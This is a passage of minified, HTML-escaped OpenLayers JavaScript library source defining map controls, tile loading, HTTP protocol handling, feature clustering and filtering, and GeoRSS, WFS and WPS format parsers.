b=parseInt(this.numDigits);return this.prefix+a.lon.toFixed(b)+this.separator+a.lat.toFixed(b)+this.suffix&#125;,CLASS_NAME:"OpenLayers.Control.MousePosition"&#125;);OpenLayers.Control.Geolocate=OpenLayers.Class(OpenLayers.Control,&#123;geolocation:null,available:"geolocation"in navigator,bind:!0,watch:!1,geolocationOptions:null,destroy:function()&#123;this.deactivate();OpenLayers.Control.prototype.destroy.apply(this,arguments)&#125;,activate:function()&#123;this.available&amp;&amp;!this.geolocation&amp;&amp;(this.geolocation=navigator.geolocation);return this.geolocation?OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.watch?this.watchId=this.geolocation.watchPosition(OpenLayers.Function.bind(this.geolocate,this),OpenLayers.Function.bind(this.failure,this),this.geolocationOptions):this.getCurrentLocation(),!0):!1:(this.events.triggerEvent("locationuncapable"),!1)&#125;,deactivate:function()&#123;this.active&amp;&amp;null!==this.watchId&amp;&amp;this.geolocation.clearWatch(this.watchId);return OpenLayers.Control.prototype.deactivate.apply(this,arguments)&#125;,geolocate:function(a)&#123;var b=(new OpenLayers.LonLat(a.coords.longitude,a.coords.latitude)).transform(new OpenLayers.Projection("EPSG:4326"),this.map.getProjectionObject());this.bind&amp;&amp;this.map.setCenter(b);this.events.triggerEvent("locationupdated",&#123;position:a,point:new OpenLayers.Geometry.Point(b.lon,b.lat)&#125;)&#125;,getCurrentLocation:function()&#123;if(!this.active||this.watch)return!1;this.geolocation.getCurrentPosition(OpenLayers.Function.bind(this.geolocate,this),OpenLayers.Function.bind(this.failure,this),this.geolocationOptions);return!0&#125;,failure:function(a)&#123;this.events.triggerEvent("locationfailed",&#123;error:a&#125;)&#125;,CLASS_NAME:"OpenLayers.Control.Geolocate"&#125;);OpenLayers.Tile.UTFGrid=OpenLayers.Class(OpenLayers.Tile,&#123;url:null,utfgridResolution:2,json:null,format:null,destroy:function()&#123;this.clear();OpenLayers.Tile.prototype.destroy.apply(this,arguments)&#125;,draw:function()&#123;var a=OpenLayers.Tile.prototype.draw.apply(this,arguments);if(a)if(this.isLoading?(this.abortLoading(),this.events.triggerEvent("reload")):(this.isLoading=!0,this.events.triggerEvent("loadstart")),this.url=this.layer.getURL(this.bounds),this.layer.useJSONP)&#123;var b=new OpenLayers.Protocol.Script(&#123;url:this.url,callback:function(a)&#123;this.isLoading=!1;this.events.triggerEvent("loadend");this.json=a.data&#125;,scope:this&#125;);b.read();this.request=b&#125;else this.request=OpenLayers.Request.GET(&#123;url:this.url,callback:function(a)&#123;this.isLoading=!1;this.events.triggerEvent("loadend");200===a.status&amp;&amp;this.parseData(a.responseText)&#125;,scope:this&#125;);else this.unload();return a&#125;,abortLoading:function()&#123;this.request&amp;&amp;(this.request.abort(),delete this.request);this.isLoading=!1&#125;,getFeatureInfo:function(a,b)&#123;var c=null;if(this.json)&#123;var d=this.getFeatureId(a,b);null!==d&amp;&amp;(c=&#123;id:d,data:this.json.data[d]&#125;)&#125;return c&#125;,getFeatureId:function(a,b)&#123;var c=null;if(this.json)&#123;var d=this.utfgridResolution,d=this.json.grid[Math.floor(b/d)].charCodeAt(Math.floor(a/d)),d=this.indexFromCharCode(d),e=this.json.keys;!isNaN(d)&amp;&amp;d in e&amp;&amp;(c=e[d])&#125;return c&#125;,indexFromCharCode:function(a)&#123;93&lt;=a&amp;&amp;a--;35&lt;=a&amp;&amp;a--;return a-32&#125;,parseData:function(a)&#123;this.format||(this.format=new OpenLayers.Format.JSON);this.json=this.format.read(a)&#125;,clear:function()&#123;this.json=null&#125;,CLASS_NAME:"OpenLayers.Tile.UTFGrid"&#125;);OpenLayers.Protocol.HTTP=OpenLayers.Class(OpenLayers.Protocol,&#123;url:null,headers:null,params:null,callback:null,scope:null,readWithPOST:!1,updateWithPOST:!1,deleteWithPOST:!1,wildcarded:!1,srsInBBOX:!1,initialize:function(a)&#123;a=a||&#123;&#125;;this.params=&#123;&#125;;this.headers=&#123;&#125;;OpenLayers.Protocol.prototype.initialize.apply(this,arguments);if(!this.filterToParams&amp;&amp;OpenLayers.Format.QueryStringFilter)&#123;var b=new OpenLayers.Format.QueryStringFilter(&#123;wildcarded:this.wildcarded,srsInBBOX:this.srsInBBOX&#125;);this.filterToParams=function(a,d)&#123;return b.write(a,d)&#125;&#125;&#125;,destroy:function()&#123;this.headers=this.params=null;OpenLayers.Protocol.prototype.destroy.apply(this)&#125;,read:function(a)&#123;OpenLayers.Protocol.prototype.read.apply(this,arguments);a=a||&#123;&#125;;a.params=OpenLayers.Util.applyDefaults(a.params,this.options.params);a=OpenLayers.Util.applyDefaults(a,this.options);a.filter&amp;&amp;this.filterToParams&amp;&amp;(a.params=this.filterToParams(a.filter,a.params));var b=void 0!==a.readWithPOST?a.readWithPOST:this.readWithPOST,c=new OpenLayers.Protocol.Response(&#123;requestType:"read"&#125;);b?(b=a.headers||&#123;&#125;,b["Content-Type"]="application/x-www-form-urlencoded",c.priv=OpenLayers.Request.POST(&#123;url:a.url,callback:this.createCallback(this.handleRead,c,a),data:OpenLayers.Util.getParameterString(a.params),headers:b&#125;)):c.priv=OpenLayers.Request.GET(&#123;url:a.url,callback:this.createCallback(this.handleRead,c,a),params:a.params,headers:a.headers&#125;);return c&#125;,handleRead:function(a,b)&#123;this.handleResponse(a,b)&#125;,create:function(a,b)&#123;b=OpenLayers.Util.applyDefaults(b,this.options);var c=new OpenLayers.Protocol.Response(&#123;reqFeatures:a,requestType:"create"&#125;);c.priv=OpenLayers.Request.POST(&#123;url:b.url,callback:this.createCallback(this.handleCreate,c,b),headers:b.headers,data:this.format.write(a)&#125;);return c&#125;,handleCreate:function(a,b)&#123;this.handleResponse(a,b)&#125;,update:function(a,b)&#123;b=b||&#123;&#125;;var c=b.url||a.url||this.options.url+"/"+a.fid;b=OpenLayers.Util.applyDefaults(b,this.options);var d=new OpenLayers.Protocol.Response(&#123;reqFeatures:a,requestType:"update"&#125;);d.priv=OpenLayers.Request[this.updateWithPOST?"POST":"PUT"](&#123;url:c,callback:this.createCallback(this.handleUpdate,d,b),headers:b.headers,data:this.format.write(a)&#125;);return d&#125;,handleUpdate:function(a,b)&#123;this.handleResponse(a,b)&#125;,"delete":function(a,b)&#123;b=b||&#123;&#125;;var c=b.url||a.url||this.options.url+"/"+a.fid;b=OpenLayers.Util.applyDefaults(b,this.options);var d=new OpenLayers.Protocol.Response(&#123;reqFeatures:a,requestType:"delete"&#125;),e=this.deleteWithPOST?"POST":"DELETE",c=&#123;url:c,callback:this.createCallback(this.handleDelete,d,b),headers:b.headers&#125;;this.deleteWithPOST&amp;&amp;(c.data=this.format.write(a));d.priv=OpenLayers.Request[e](c);return d&#125;,handleDelete:function(a,b)&#123;this.handleResponse(a,b)&#125;,handleResponse:function(a,b)&#123;var c=a.priv;b.callback&amp;&amp;(200&lt;=c.status&amp;&amp;300&gt;c.status?("delete"!=a.requestType&amp;&amp;(a.features=this.parseFeatures(c)),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE,b.callback.call(b.scope,a))&#125;,parseFeatures:function(a)&#123;var b=a.responseXML;b&amp;&amp;b.documentElement||(b=a.responseText);return!b||0&gt;=b.length?null:this.format.read(b)&#125;,commit:function(a,b)&#123;function c(a)&#123;for(var b=a.features?a.features.length:0,c=Array(b),e=0;e&lt;b;++e)c[e]=a.features[e].fid;r.insertIds=c;d.apply(this,[a])&#125;function d(a)&#123;this.callUserCallback(a,b);q=q&amp;&amp;a.success();f++;f&gt;=p&amp;&amp;b.callback&amp;&amp;(r.code=q?OpenLayers.Protocol.Response.SUCCESS:OpenLayers.Protocol.Response.FAILURE,b.callback.apply(b.scope,[r]))&#125;b=OpenLayers.Util.applyDefaults(b,this.options);var e=[],f=0,g=&#123;&#125;;g[OpenLayers.State.INSERT]=[];g[OpenLayers.State.UPDATE]=[];g[OpenLayers.State.DELETE]=[];for(var h,k,l=[],m=0,n=a.length;m&lt;n;++m)if(h=a[m],k=g[h.state])k.push(h),l.push(h);var p=(0&lt;g[OpenLayers.State.INSERT].length?1:0)+g[OpenLayers.State.UPDATE].length+g[OpenLayers.State.DELETE].length,q=!0,r=new OpenLayers.Protocol.Response(&#123;reqFeatures:l&#125;);h=g[OpenLayers.State.INSERT];0&lt;h.length&amp;&amp;e.push(this.create(h,OpenLayers.Util.applyDefaults(&#123;callback:c,scope:this&#125;,b.create)));h=g[OpenLayers.State.UPDATE];for(m=h.length-1;0&lt;=m;--m)e.push(this.update(h[m],OpenLayers.Util.applyDefaults(&#123;callback:d,scope:this&#125;,b.update)));h=g[OpenLayers.State.DELETE];for(m=h.length-1;0&lt;=m;--m)e.push(this["delete"](h[m],OpenLayers.Util.applyDefaults(&#123;callback:d,scope:this&#125;,b["delete"])));return e&#125;,abort:function(a)&#123;a&amp;&amp;a.priv.abort()&#125;,callUserCallback:function(a,b)&#123;var c=b[a.requestType];c&amp;&amp;c.callback&amp;&amp;c.callback.call(c.scope,a)&#125;,CLASS_NAME:"OpenLayers.Protocol.HTTP"&#125;);OpenLayers.Strategy.Cluster=OpenLayers.Class(OpenLayers.Strategy,&#123;distance:20,threshold:null,features:null,clusters:null,clustering:!1,resolution:null,activate:function()&#123;var a=OpenLayers.Strategy.prototype.activate.call(this);if(a)this.layer.events.on(&#123;beforefeaturesadded:this.cacheFeatures,featuresremoved:this.clearCache,moveend:this.cluster,scope:this&#125;);return a&#125;,deactivate:function()&#123;var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;(this.clearCache(),this.layer.events.un(&#123;beforefeaturesadded:this.cacheFeatures,featuresremoved:this.clearCache,moveend:this.cluster,scope:this&#125;));return a&#125;,cacheFeatures:function(a)&#123;var b=!0;this.clustering||(this.clearCache(),this.features=a.features,this.cluster(),b=!1);return b&#125;,clearCache:function()&#123;this.clustering||(this.features=null)&#125;,cluster:function(a)&#123;if((!a||a.zoomChanged)&amp;&amp;this.features&amp;&amp;(a=this.layer.map.getResolution(),a!=this.resolution||!this.clustersExist()))&#123;this.resolution=a;a=[];for(var b,c,d,e=0;e&lt;this.features.length;++e)if(b=this.features[e],b.geometry)&#123;c=!1;for(var f=a.length-1;0&lt;=f;--f)if(d=a[f],this.shouldCluster(d,b))&#123;this.addToCluster(d,b);c=!0;break&#125;c||a.push(this.createCluster(this.features[e]))&#125;this.clustering=!0;this.layer.removeAllFeatures();this.clustering=!1;if(0&lt;a.length)&#123;if(1&lt;this.threshold)for(b=a.slice(),a=[],e=0,d=b.length;e&lt;d;++e)c=b[e],c.attributes.count&lt;this.threshold?Array.prototype.push.apply(a,c.cluster):a.push(c);this.clustering=!0;this.layer.addFeatures(a);this.clustering=!1&#125;this.clusters=a&#125;&#125;,clustersExist:function()&#123;var a=!1;if(this.clusters&amp;&amp;0&lt;this.clusters.length&amp;&amp;this.clusters.length==this.layer.features.length)for(var a=!0,b=0;b&lt;this.clusters.length;++b)if(this.clusters[b]!=this.layer.features[b])&#123;a=!1;break&#125;return a&#125;,shouldCluster:function(a,b)&#123;var c=a.geometry.getBounds().getCenterLonLat(),d=b.geometry.getBounds().getCenterLonLat();return Math.sqrt(Math.pow(c.lon-d.lon,2)+Math.pow(c.lat-d.lat,2))/this.resolution&lt;=this.distance&#125;,addToCluster:function(a,b)&#123;a.cluster.push(b);a.attributes.count+=1&#125;,createCluster:function(a)&#123;var b=a.geometry.getBounds().getCenterLonLat(),b=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(b.lon,b.lat),&#123;count:1&#125;);b.cluster=[a];return b&#125;,CLASS_NAME:"OpenLayers.Strategy.Cluster"&#125;);OpenLayers.Strategy.Filter=OpenLayers.Class(OpenLayers.Strategy,&#123;filter:null,cache:null,caching:!1,activate:function()&#123;var a=OpenLayers.Strategy.prototype.activate.apply(this,arguments);a&amp;&amp;(this.cache=[],this.layer.events.on(&#123;beforefeaturesadded:this.handleAdd,beforefeaturesremoved:this.handleRemove,scope:this&#125;));return a&#125;,deactivate:function()&#123;this.cache=null;this.layer&amp;&amp;this.layer.events&amp;&amp;this.layer.events.un(&#123;beforefeaturesadded:this.handleAdd,beforefeaturesremoved:this.handleRemove,scope:this&#125;);return OpenLayers.Strategy.prototype.deactivate.apply(this,arguments)&#125;,handleAdd:function(a)&#123;if(!this.caching&amp;&amp;this.filter)&#123;var b=a.features;a.features=[];for(var c,d=0,e=b.length;d&lt;e;++d)c=b[d],this.filter.evaluate(c)?a.features.push(c):this.cache.push(c)&#125;&#125;,handleRemove:function(a)&#123;this.caching||(this.cache=[])&#125;,setFilter:function(a)&#123;this.filter=a;a=this.cache;this.cache=[];this.handleAdd(&#123;features:this.layer.features&#125;);0&lt;this.cache.length&amp;&amp;(this.caching=!0,this.layer.removeFeatures(this.cache.slice()),this.caching=!1);0&lt;a.length&amp;&amp;(a=&#123;features:a&#125;,this.handleAdd(a),0&lt;a.features.length&amp;&amp;(this.caching=!0,this.layer.addFeatures(a.features),this.caching=!1))&#125;,CLASS_NAME:"OpenLayers.Strategy.Filter"&#125;);OpenLayers.Protocol.SOS=function(a)&#123;a=OpenLayers.Util.applyDefaults(a,OpenLayers.Protocol.SOS.DEFAULTS);var b=OpenLayers.Protocol.SOS["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported SOS version: "+a.version;return new b(a)&#125;;OpenLayers.Protocol.SOS.DEFAULTS=&#123;version:"1.0.0"&#125;;OpenLayers.Format.WFSDescribeFeatureType=OpenLayers.Class(OpenLayers.Format.XML,&#123;regExes:&#123;trimSpace:/^\s*|\s*$/g&#125;,namespaces:&#123;xsd:"http://www.w3.org/2001/XMLSchema"&#125;,readers:&#123;xsd:&#123;schema:function(a,b)&#123;var c=[],d=&#123;&#125;,e,f;this.readChildNodes(a,&#123;complexTypes:c,customTypes:d&#125;);var g=a.attributes,h,k;e=0;for(f=g.length;e&lt;f;++e)h=g[e],k=h.name,0===k.indexOf("xmlns")?this.setNamespace(k.split(":")[1]||"",h.value):b[k]=h.value;b.featureTypes=c;b.targetPrefix=this.namespaceAlias[b.targetNamespace];e=0;for(f=c.length;e&lt;f;++e)g=c[e],h=d[g.typeName],d[g.typeName]&amp;&amp;(g.typeName=h.name)&#125;,complexType:function(a,b)&#123;var c=&#123;typeName:a.getAttribute("name")&#125;;this.readChildNodes(a,c);b.complexTypes.push(c)&#125;,complexContent:function(a,b)&#123;this.readChildNodes(a,b)&#125;,extension:function(a,b)&#123;this.readChildNodes(a,b)&#125;,sequence:function(a,b)&#123;var c=&#123;elements:[]&#125;;this.readChildNodes(a,c);b.properties=c.elements&#125;,element:function(a,b)&#123;var c;if(b.elements)&#123;var d=&#123;&#125;;c=a.attributes;for(var e,f=0,g=c.length;f&lt;g;++f)e=c[f],d[e.name]=e.value;c=d.type;c||(c=&#123;&#125;,this.readChildNodes(a,c),d.restriction=c,d.type=c.base);d.localType=(c.base||c).split(":").pop();b.elements.push(d);this.readChildNodes(a,d)&#125;b.complexTypes&amp;&amp;(c=a.getAttribute("type"),d=c.split(":").pop(),b.customTypes[d]=&#123;name:a.getAttribute("name"),type:c&#125;)&#125;,annotation:function(a,b)&#123;b.annotation=&#123;&#125;;this.readChildNodes(a,b.annotation)&#125;,appinfo:function(a,b)&#123;b.appinfo||(b.appinfo=[]);b.appinfo.push(this.getChildValue(a))&#125;,documentation:function(a,b)&#123;b.documentation||(b.documentation=[]);var c=this.getChildValue(a);b.documentation.push(&#123;lang:a.getAttribute("xml:lang"),textContent:c.replace(this.regExes.trimSpace,"")&#125;)&#125;,simpleType:function(a,b)&#123;this.readChildNodes(a,b)&#125;,restriction:function(a,b)&#123;b.base=a.getAttribute("base");this.readRestriction(a,b)&#125;&#125;&#125;,readRestriction:function(a,b)&#123;for(var c=a.childNodes,d,e,f=0,g=c.length;f&lt;g;++f)d=c[f],1==d.nodeType&amp;&amp;(e=d.nodeName.split(":").pop(),d=d.getAttribute("value"),b[e]?("string"==typeof b[e]&amp;&amp;(b[e]=[b[e]]),b[e].push(d)):b[e]=d)&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;&#125;;if("ExceptionReport"===a.nodeName.split(":").pop())&#123;var c=new OpenLayers.Format.OGCExceptionReport;b.error=c.read(a)&#125;else this.readNode(a,b);return b&#125;,CLASS_NAME:"OpenLayers.Format.WFSDescribeFeatureType"&#125;);OpenLayers.Format.GeoRSS=OpenLayers.Class(OpenLayers.Format.XML,&#123;rssns:"http://backend.userland.com/rss2",featureNS:"http://mapserver.gis.umn.edu/mapserver",georssns:"http://www.georss.org/georss",geons:"http://www.w3.org/2003/01/geo/wgs84_pos#",featureTitle:"Untitled",featureDescription:"No Description",gmlParser:null,xy:!1,createGeometryFromItem:function(a)&#123;var b=this.getElementsByTagNameNS(a,this.georssns,"point"),c=this.getElementsByTagNameNS(a,this.geons,"lat"),d=this.getElementsByTagNameNS(a,this.geons,"long"),e=this.getElementsByTagNameNS(a,this.georssns,"line"),f=this.getElementsByTagNameNS(a,this.georssns,"polygon"),g=this.getElementsByTagNameNS(a,this.georssns,"where");a=this.getElementsByTagNameNS(a,this.georssns,"box");if(0&lt;b.length||0&lt;c.length&amp;&amp;0&lt;d.length)&#123;0&lt;b.length?(c=OpenLayers.String.trim(b[0].firstChild.nodeValue).split(/\s+/),2!=c.length&amp;&amp;(c=OpenLayers.String.trim(b[0].firstChild.nodeValue).split(/\s*,\s*/))):c=[parseFloat(c[0].firstChild.nodeValue),parseFloat(d[0].firstChild.nodeValue)];var h=new OpenLayers.Geometry.Point(c[1],c[0])&#125;else if(0&lt;e.length)&#123;c=OpenLayers.String.trim(this.getChildValue(e[0])).split(/\s+/);d=[];e=0;for(f=c.length;e&lt;f;e+=2)b=new OpenLayers.Geometry.Point(c[e+1],c[e]),d.push(b);h=new OpenLayers.Geometry.LineString(d)&#125;else if(0&lt;f.length)&#123;c=OpenLayers.String.trim(this.getChildValue(f[0])).split(/\s+/);d=[];e=0;for(f=c.length;e&lt;f;e+=2)b=new OpenLayers.Geometry.Point(c[e+1],c[e]),d.push(b);h=new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(d)])&#125;else 0&lt;g.length?(this.gmlParser||(this.gmlParser=new OpenLayers.Format.GML(&#123;xy:this.xy&#125;)),h=this.gmlParser.parseFeature(g[0]).geometry):0&lt;a.length&amp;&amp;(c=OpenLayers.String.trim(a[0].firstChild.nodeValue).split(/\s+/),d=[],3&lt;c.length&amp;&amp;(b=new OpenLayers.Geometry.Point(c[1],c[0]),d.push(b),b=new OpenLayers.Geometry.Point(c[1],c[2]),d.push(b),b=new OpenLayers.Geometry.Point(c[3],c[2]),d.push(b),b=new OpenLayers.Geometry.Point(c[3],c[0]),d.push(b),b=new OpenLayers.Geometry.Point(c[1],c[0]),d.push(b)),h=new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(d)]));h&amp;&amp;(this.internalProjection&amp;&amp;this.externalProjection)&amp;&amp;h.transform(this.externalProjection,this.internalProjection);return h&#125;,createFeatureFromItem:function(a)&#123;var b=this.createGeometryFromItem(a),c=this._getChildValue(a,"*","title",this.featureTitle),d=this._getChildValue(a,"*","description",this._getChildValue(a,"*","content",this._getChildValue(a,"*","summary",this.featureDescription))),e=this._getChildValue(a,"*","link");if(!e)try&#123;e=this.getElementsByTagNameNS(a,"*","link")[0].getAttribute("href")&#125;catch(f)&#123;e=null&#125;a=this._getChildValue(a,"*","id",null);b=new OpenLayers.Feature.Vector(b,&#123;title:c,description:d,link:e&#125;);b.fid=a;return b&#125;,_getChildValue:function(a,b,c,d)&#123;return(a=this.getElementsByTagNameNS(a,b,c))&amp;&amp;a[0]&amp;&amp;a[0].firstChild&amp;&amp;a[0].firstChild.nodeValue?this.getChildValue(a[0]):void 0==d?"":d&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=null,b=this.getElementsByTagNameNS(a,"*","item");0==b.length&amp;&amp;(b=this.getElementsByTagNameNS(a,"*","entry"));a=b.length;for(var c=Array(a),d=0;d&lt;a;d++)c[d]=this.createFeatureFromItem(b[d]);return c&#125;,write:function(a)&#123;var b;if(OpenLayers.Util.isArray(a))&#123;b=this.createElementNS(this.rssns,"rss");for(var c=0,d=a.length;c&lt;d;c++)b.appendChild(this.createFeatureXML(a[c]))&#125;else b=this.createFeatureXML(a);return OpenLayers.Format.XML.prototype.write.apply(this,[b])&#125;,createFeatureXML:function(a)&#123;var b=this.buildGeometryNode(a.geometry),c=this.createElementNS(this.rssns,"item"),d=this.createElementNS(this.rssns,"title");d.appendChild(this.createTextNode(a.attributes.title?a.attributes.title:""));var e=this.createElementNS(this.rssns,"description");e.appendChild(this.createTextNode(a.attributes.description?a.attributes.description:""));c.appendChild(d);c.appendChild(e);a.attributes.link&amp;&amp;(d=this.createElementNS(this.rssns,"link"),d.appendChild(this.createTextNode(a.attributes.link)),c.appendChild(d));for(var f in a.attributes)"link"!=f&amp;&amp;("title"!=f&amp;&amp;"description"!=f)&amp;&amp;(d=this.createTextNode(a.attributes[f]),e=f,-1!=f.search(":")&amp;&amp;(e=f.split(":")[1]),e=this.createElementNS(this.featureNS,"feature:"+e),e.appendChild(d),c.appendChild(e));c.appendChild(b);return c&#125;,buildGeometryNode:function(a)&#123;this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));var b;if("OpenLayers.Geometry.Polygon"==a.CLASS_NAME)b=this.createElementNS(this.georssns,"georss:polygon"),b.appendChild(this.buildCoordinatesNode(a.components[0]));else if("OpenLayers.Geometry.LineString"==a.CLASS_NAME)b=this.createElementNS(this.georssns,"georss:line"),b.appendChild(this.buildCoordinatesNode(a));else if("OpenLayers.Geometry.Point"==a.CLASS_NAME)b=this.createElementNS(this.georssns,"georss:point"),b.appendChild(this.buildCoordinatesNode(a));else throw"Couldn't parse "+a.CLASS_NAME;return b&#125;,buildCoordinatesNode:function(a)&#123;var b=null;a.components&amp;&amp;(b=a.components);if(b)&#123;a=b.length;for(var c=Array(a),d=0;d&lt;a;d++)c[d]=b[d].y+" "+b[d].x;b=c.join(" ")&#125;else b=a.y+" "+a.x;return this.createTextNode(b)&#125;,CLASS_NAME:"OpenLayers.Format.GeoRSS"&#125;);OpenLayers.Format.WPSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,&#123;defaultVersion:"1.0.0",CLASS_NAME:"OpenLayers.Format.WPSCapabilities"&#125;);OpenLayers.Format.WPSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;ows:"http://www.opengis.net/ows/1.1",wps:"http://www.opengis.net/wps/1.0.0",xlink:"http://www.w3.org/1999/xlink"&#125;,regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,initialize:function(a)&#123;OpenLayers.Format.XML.prototype.initialize.apply(this,[a])&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;&#125;;this.readNode(a,b);return b&#125;,readers:&#123;wps:&#123;Capabilities:function(a,b)&#123;this.readChildNodes(a,b)&#125;,ProcessOfferings:function(a,b)&#123;b.processOfferings=&#123;&#125;;this.readChildNodes(a,b.processOfferings)&#125;,Process:function(a,b)&#123;var c=&#123;processVersion:this.getAttributeNS(a,this.namespaces.wps,"processVersion")&#125;;this.readChildNodes(a,c);b[c.identifier]=c&#125;,Languages:function(a,b)&#123;b.languages=[];this.readChildNodes(a,b.languages)&#125;,Default:function(a,b)&#123;var c=&#123;isDefault:!0&#125;;this.readChildNodes(a,c);b.push(c)&#125;,Supported:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.push(c)&#125;&#125;,ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows&#125;,CLASS_NAME:"OpenLayers.Format.WPSCapabilities.v1_0_0"&#125;);OpenLayers.Control.PinchZoom=OpenLayers.Class(OpenLayers.Control,&#123;type:OpenLayers.Control.TYPE_TOOL,pinchOrigin:null,currentCenter:null,autoActivate:!0,preserveCenter:!1,initialize:function(a)&#123;OpenLayers.Control.prototype.initialize.apply(this,arguments);this.handler=new OpenLayers.Handler.Pinch(this,&#123;start:this.pinchStart,move:this.pinchMove,done:this.pinchDone&#125;,this.handlerOptions)&#125;,pinchStart:function(a,b)&#123;var c=this.preserveCenter?this.map.getPixelFromLonLat(this.map.getCenter()):a.xy;this.currentCenter=this.pinchOrigin=c&#125;,pinchMove:function(a,b)&#123;var c=b.scale,d=this.map.layerContainerOriginPx,e=this.pinchOrigin,f=this.preserveCenter?this.map.getPixelFromLonLat(this.map.getCenter()):a.xy,g=Math.round(d.x+f.x-e.x+(c-1)*(d.x-e.x)),d=Math.round(d.y+f.y-e.y+(c-1)*(d.y-e.y));this.map.applyTransform(g,d,c);this.currentCenter=f&#125;,pinchDone:function(a,b,c)&#123;this.map.applyTransform();a=this.map.getZoomForResolution(this.map.getResolution()/c.scale,!0);if(a!==this.map.getZoom()||!this.currentCenter.equals(this.pinchOrigin))&#123;b=this.map.getResolutionForZoom(a);c=this.map.getLonLatFromPixel(this.pinchOrigin);var d=this.currentCenter,e=this.map.getSize();c.lon+=b*(e.w/2-d.x);c.lat-=b*(e.h/2-d.y);this.map.div.clientWidth=this.map.div.clientWidth;this.map.setCenter(c,a)&#125;&#125;,CLASS_NAME:"OpenLayers.Control.PinchZoom"&#125;);OpenLayers.Control.TouchNavigation=OpenLayers.Class(OpenLayers.Control,&#123;dragPan:null,dragPanOptions:null,pinchZoom:null,pinchZoomOptions:null,clickHandlerOptions:null,documentDrag:!1,autoActivate:!0,initialize:function(a)&#123;this.handlers=&#123;&#125;;OpenLayers.Control.prototype.initialize.apply(this,arguments)&#125;,destroy:function()&#123;this.deactivate();this.dragPan&amp;&amp;this.dragPan.destroy();this.dragPan=null;this.pinchZoom&amp;&amp;(this.pinchZoom.destroy(),delete this.pinchZoom);OpenLayers.Control.prototype.destroy.apply(this,arguments)&#125;,activate:function()&#123;return OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.dragPan.activate(),this.handlers.click.activate(),this.pinchZoom.activate(),!0):!1&#125;,deactivate:function()&#123;return OpenLayers.Control.prototype.deactivate.apply(this,arguments)?(this.dragPan.deactivate(),this.handlers.click.deactivate(),this.pinchZoom.deactivate(),!0):!1&#125;,draw:function()&#123;var a=&#123;click:this.defaultClick,dblclick:this.defaultDblClick&#125;,b=OpenLayers.Util.extend(&#123;"double":!0,stopDouble:!0,pixelTolerance:2&#125;,this.clickHandlerOptions);this.handlers.click=new OpenLayers.Handler.Click(this,a,b);this.dragPan=new OpenLayers.Control.DragPan(OpenLayers.Util.extend(&#123;map:this.map,documentDrag:this.documentDrag&#125;,this.dragPanOptions));this.dragPan.draw();this.pinchZoom=new OpenLayers.Control.PinchZoom(OpenLayers.Util.extend(&#123;map:this.map&#125;,this.pinchZoomOptions))&#125;,defaultClick:function(a)&#123;a.lastTouches&amp;&amp;2==a.lastTouches.length&amp;&amp;this.map.zoomOut()&#125;,defaultDblClick:function(a)&#123;this.map.zoomTo(this.map.zoom+1,a.xy)&#125;,CLASS_NAME:"OpenLayers.Control.TouchNavigation"&#125;);OpenLayers.Console.warn("OpenLayers.Rico is deprecated");OpenLayers.Rico=OpenLayers.Rico||&#123;&#125;;OpenLayers.Rico.Color=OpenLayers.Class(&#123;initialize:function(a,b,c)&#123;this.rgb=&#123;r:a,g:b,b:c&#125;&#125;,setRed:function(a)&#123;this.rgb.r=a&#125;,setGreen:function(a)&#123;this.rgb.g=a&#125;,setBlue:function(a)&#123;this.rgb.b=a&#125;,setHue:function(a)&#123;var b=this.asHSB();b.h=a;this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,b.b)&#125;,setSaturation:function(a)&#123;var b=this.asHSB();b.s=a;this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,b.b)&#125;,setBrightness:function(a)&#123;var b=this.asHSB();b.b=a;this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,b.b)&#125;,darken:function(a)&#123;var b=this.asHSB();this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,Math.max(b.b-a,0))&#125;,brighten:function(a)&#123;var b=this.asHSB();this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,Math.min(b.b+a,1))&#125;,blend:function(a)&#123;this.rgb.r=Math.floor((this.rgb.r+a.rgb.r)/2);this.rgb.g=Math.floor((this.rgb.g+a.rgb.g)/2);this.rgb.b=Math.floor((this.rgb.b+a.rgb.b)/2)&#125;,isBright:function()&#123;this.asHSB();return 0.5&lt;this.asHSB().b&#125;,isDark:function()&#123;return!this.isBright()&#125;,asRGB:function()&#123;return"rgb("+this.rgb.r+","+this.rgb.g+","+this.rgb.b+")"&#125;,asHex:function()&#123;return"#"+this.rgb.r.toColorPart()+this.rgb.g.toColorPart()+this.rgb.b.toColorPart()&#125;,asHSB:function()&#123;return OpenLayers.Rico.Color.RGBtoHSB(this.rgb.r,this.rgb.g,this.rgb.b)&#125;,toString:function()&#123;return this.asHex()&#125;&#125;);OpenLayers.Rico.Color.createFromHex=function(a)&#123;if(4==a.length)&#123;var b=a;a="#";for(var 